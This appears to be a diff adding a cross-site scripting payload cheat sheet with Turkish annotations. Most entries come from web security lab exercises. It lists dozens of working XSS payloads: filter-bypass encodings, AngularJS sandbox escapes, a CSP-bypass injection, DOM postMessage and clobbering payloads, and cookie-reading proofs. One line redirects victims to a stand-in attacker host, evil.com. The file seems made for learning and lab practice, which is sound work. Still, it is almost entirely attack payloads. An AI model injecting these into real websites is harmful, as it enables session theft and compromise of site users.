@@ -1,0 +1,53 @@
+xss"</sc"ript><sv"g/onloa"d=aler"t"(window.INITIAL_STATE.system.cookie)> 
+xss"</script><svg/onload=alert(document.domain)>
+Cookie: hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
+var hav="xss</script><svg/onload=alert(document.domain)>"
+<a href='javascript:alert(document.domain);'>Click Me</a>
+<h1><a href='javascript:alert(document.domain);'>Click Here</a><h1><img src=x onerror=alert(document.domain)>
+<h1><a href='javascript:alert(document.domain);'>Click Here</a><h1><img src=x onerror=document.location='https://evil.com'>
+?win=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+/asd',%20alert(document.location),%20%27
+<img src=x onerror=alert(1)>
+javascript:alert(document.domain)
+<img src=x onerror=alert(document.cookie)>
+'"><img src=x onerror=alert(1)>
+<img src=x onerror=alert(1)>
+<script>alert(1)</script>
+' onmouseover='alert(1)
+'-alert(1)-'
+<svg onload=alert(1)>
+X-Forwarded-Host: bing.com"><img src/onerror=prompt(document.cookie)>
+"><svg onload=alert(1)>
+<img src=1 onerror=alert(1)>
+?returnPath=alert(document.cookie)
+#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+"onmouseover="alert(1)
+javascript:alert(1)
+"></select><img%20src=1%20onerror=alert(1)>
+{{$on.constructor('alert(1)')()}} => Angular js. ng-app kütüphanesindeki zafiyet 
+\"-alert(1)}//
+<><img src=1 onerror=alert(1)>
+%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x => payload'ın decode edilmiş hali => <xss id=x onfocus=alert(document.cookie) tabindex=1>#x
+%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+%27accesskey=%27x%27onclick=%27alert(1)
+</script><script>alert(1)</script>
+\'-alert(1)//
+http://foo?&apos;-alert(1)-&apos;
+${alert(1)}
+1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x
+%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
+decode hali => <svg><a><animate+attributeName=href+values=javascript:alert(1) /><text+x=20+y=20>Click me</text></a>
+&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+decode hali => &'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27          
+decode hali => <script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
+				DOM PAYLOADS	
+" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
+<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
+<script>alert(document.cookie);</script>
